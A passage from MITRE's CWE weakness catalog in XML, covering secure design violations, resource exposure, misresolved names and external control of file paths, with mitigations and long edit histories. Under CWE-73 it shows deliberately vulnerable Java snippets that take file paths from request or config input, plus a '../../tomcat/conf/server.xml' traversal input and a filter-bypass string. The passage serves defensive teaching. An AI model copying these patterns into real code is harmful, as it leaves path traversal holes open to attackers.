					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-01-12">Design Principle Violation: Reliance on Security through Obscurity</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="657" Name="Violation of Secure Design Principles" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product violates well-established principles for secure design.</Description>
         <Extended_Description>This can introduce resultant weaknesses or make it easier for developers to introduce related weaknesses during implementation. Because code is centered around design, it can be resource-intensive to fix design problems.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="710" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
	 <Taxonomy_Mappings>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
             <Entry_Name>Req SD-3</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
             <Entry_Name>Req SD-4</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
             <Entry_Name>Req SI-1</Entry_Name>
           </Taxonomy_Mapping>
	 </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-196"/>
            <Reference External_Reference_ID="REF-546"/>
         </References>
	 <Notes>
	    <Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
	 </Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2008-01-30</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="668" Name="Exposure of Resource to Wrong Sphere" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource.</Description>
         <Extended_Description>
            <xhtml:p>Resources such as files and directories may be inadvertently exposed through mechanisms such as insecure permissions, or when a program accidentally operates on the wrong object. For example, a program may intend that private files can only be provided to a specific user. This effectively defines a control sphere that is intended to prevent attackers from accessing these private files. If the file permissions are insecure, then parties other than the user will be able to access those files.</xhtml:p>
            <xhtml:p>A separate control sphere might effectively require that the user can only access the private files, but not any other files on the system. If the program does not ensure that the user is only requesting private files, then the user might be able to access other files on the system.</xhtml:p>
            <xhtml:p>In either case, the end result is that a resource has been exposed to the wrong party.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <References>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Notes>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Discouraged (this CWE ID should not be used to map to real-world vulnerabilities).</xhtml:p>
               <xhtml:p>Rationale: CWE-668 is high-level and can be used as a catch-all when lower-level CWE IDs might be applicable. It is sometimes used for low-information vulnerability reports [REF-1287]. It is a level-1 Class (i.e., a child of a Pillar). It is not useful for trend analysis.</xhtml:p>
               <xhtml:p>Comments: closely analyze the specific mistake that is allowing the resource to be exposed, and perform a CWE mapping for that mistake.</xhtml:p>
	    </Note>
            <Note Type="Theoretical">A "control sphere" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for "administrators" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be "users who are authenticated to the operating system on which the product is installed." Each sphere has different sets of actors and allowable behaviors.</Note>
         </Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Content Team</Submission_Name>
				<Submission_Organization>MITRE</Submission_Organization>
                <Submission_Date>2008-04-11</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-22</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Clarified description to include permissions.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Relevant_Properties</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="706" Name="Use of Incorrectly-Resolved Name or Reference" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product uses a name or reference to access a resource, but the name/reference resolves to a resource that is outside of the intended control sphere.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="99" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="159"/>
            <Related_Attack_Pattern CAPEC_ID="177"/>
            <Related_Attack_Pattern CAPEC_ID="48"/>
            <Related_Attack_Pattern CAPEC_ID="641"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2008-09-09</Submission_Date>
		<Submission_Comment>Note: this date reflects when the entry was first published. Draft versions of this entry were provided to members of the CWE community and modified between Draft 9 and 1.0.</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="73" Name="External Control of File Name or Path" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product allows user input to control or influence paths or file names that are used in filesystem operations.</Description>
         <Extended_Description>
            <xhtml:p>This could allow an attacker to access or modify system files or other files that are critical to the application.</xhtml:p>
            <xhtml:p>Path manipulation errors occur when the following two conditions are met:</xhtml:p>
            <xhtml:div style="margin-left:1em;">
               <xhtml:div>1. An attacker can specify a path used in an operation on the filesystem.</xhtml:div>
               <xhtml:div>2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.</xhtml:div>
            </xhtml:div>
            <xhtml:p>For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="642" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="22" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="41" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="98" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="434" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="59" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Operating_System Class="Unix" Prevalence="Often"/>
            <Operating_System Class="Windows" Prevalence="Often"/>
            <Operating_System Class="macOS" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>The application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Modify Files or Directories</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>The application can operate on unexpected files. This may violate integrity if the filename is written to, or if the filename is for a program or other form of executable code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>The application can operate on unexpected files. Availability can be violated if the attacker specifies an unexpected file that the application modifies. Availability can also be affected if the attacker specifies a filename for a large file, or points to a special device or a file that does not have the format that the application expects.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>The external control or influence of filenames can often be detected using automated static analysis that models data flow within the product.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
               </Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>When the set of filenames is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames, and reject all other inputs. For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap provide this capability.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>
                  <xhtml:p>Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory.</xhtml:p>
                  <xhtml:p>Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59).</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Installation</Phase>
               <Phase>Operation</Phase>
               <Description>Use OS-level permissions and run as a low-privileged user to limit the scope of any successful attack.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Description>If you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-65">
               <Intro_Text>The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "../../tomcat/conf/server.xml", which causes the application to delete one of its own configuration files (CWE-22).</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String rName = request.getParameter("reportName");<xhtml:br/>File rFile = new File("/usr/local/apfr/reports/" + rName);<xhtml:br/>...<xhtml:br/>rFile.delete();</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-66">
               <Intro_Text>The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>fis = new FileInputStream(cfg.getProperty("sub")+".txt");<xhtml:br/>amt = fis.read(arr);<xhtml:br/>out.println(arr);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-5748</Reference>
               <Description>Chain: external control of values for user's desired language and theme enables path traversal.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5748</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5764</Reference>
               <Description>Chain: external control of user's target language enables remote file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5764</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
